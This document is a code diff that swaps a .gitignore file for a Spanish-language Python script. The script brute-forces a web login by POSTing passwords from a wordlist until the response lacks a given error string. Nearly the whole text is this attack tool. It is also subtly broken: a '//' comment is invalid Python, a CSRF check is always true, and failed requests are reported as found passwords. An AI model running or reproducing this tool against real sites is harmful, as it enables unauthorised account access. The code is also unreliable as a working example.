@@ -1,18 +1,56 @@
-# Build and Release Folders
-bin-debug/
-bin-release/
-[Oo]bj/
-[Bb]in/
+import requests
+import sys
+import time 
 
-# Other files and folders
-.settings/
+url = input("Ingresar URL: ")
+username = input ("Ingresa el usuario: ")
+error= input("Ingresa el campo a descrifrar: ")
 
-# Executables
-*.swf
-*.air
-*.ipa
-*.apk
+z= """
 
-# Project files, i.e. `.project`, `.actionScriptProperties` and `.flexProperties`
-# should NOT be excluded as they contain compiler settings and other important
-# information for Eclipse / Flash Builder.
+    Verificando...
+    
+"""
+for c in z:
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
+    
+try:
+    def brute(username, url, error):
+        count=0
+        for password in passwords:
+            password= password.strip()
+            count += 1
+            print("Intento #"+ str(count) + " con la contraseña "+ password)
+            dataCrack={"user": username, "password": password}
+            
+            try: 
+                res= requests.post(url, data= dataCrack)
+                if error in str(res.content):
+                    pass
+                elif "CRSF" or "csrf" in str(res.content):
+                    print("Script invalido")
+                    sys.exit(0)
+                    exit()
+                else:
+                        print("contraseña encontrada")
+                        print("La contrasseña del usuario: "+ username + "es "+ password)
+                        sys.exit(0)
+                        exit()
+                        
+            except:
+                print("contraseña encontrada")
+                print("La contrasseña del usuario: "+ username + " es "+ password)
+                sys.exit(0)
+                exit()
+                   
+except:
+    print("Error en la conexion")
+        
+with open("codigo.txt", "r") as passwords: //.txt archivo de tipo texto donde esta almacenado el codigo ascii que seran las posibles contraseñas
+    brute(username, url, error) 
+    
+    
+        
+         
